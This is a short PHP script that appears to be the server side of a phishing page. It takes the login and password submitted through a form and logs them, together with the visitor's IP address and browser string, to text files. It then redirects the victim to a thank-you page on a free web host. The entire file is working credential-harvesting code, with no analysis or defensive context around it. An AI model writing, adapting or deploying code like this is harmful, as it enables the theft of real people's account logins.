<?PHP
$Log = $_POST['login'];
$Pass = $_POST['pass'];
$Ip = $_SERVER['REMOTE_ADDR'];
$User = $_SERVER['HTTP_USER_AGENT'];
$log = fopen("accs_dull_info.txt","at");
$log_ch = fopen ("accs.txt", "at");
fwrite($log,"$Log:$Pass | $Ip | $User \n");
fclose($log);
$log_ch = fopen ("accs.txt", "at");
fwrite($log_ch,"$Log:$Pass \n");
fclose($log_ch);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://terribleornot.000webhostapp.com/tnx.php'></head></html>";
?>